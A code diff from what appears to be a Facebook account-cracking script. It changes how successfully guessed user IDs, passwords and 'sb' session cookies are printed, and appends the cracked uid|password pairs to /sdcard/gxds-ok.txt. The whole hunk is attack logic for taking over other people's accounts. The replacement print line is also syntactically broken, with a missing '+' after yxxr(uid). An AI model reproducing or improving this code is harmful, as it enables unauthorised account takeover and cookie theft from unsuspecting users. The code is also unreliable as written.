@@ -490,11 +490,8 @@ def gxds_files(uid, pxss):
                     ]
                 )
                 xcki = coki.split("sb=")[1]
-                coki1 = coki.split("1000")[1]
-                xuid = "1000" + coki1[0:11]
-                print( "\r\r\033[38;5;46m[GXDS-✓] \033[38;5;47m" + xuid + " | " + ps + "\n\033[38;5;46m[COOKIES] \033[38;5;49msb=" + xcki + "\n\033[38;5;48m————————————————————————————————————"
-                )
-                open("/sdcard/gxds-ok.txt", "a").write(xd + "|" + ps + "\n")
+                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " -\033[1;35m " + yxxr(uid)"\n\033[1;32m[COOKIES]" + xcki)
+                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             else:
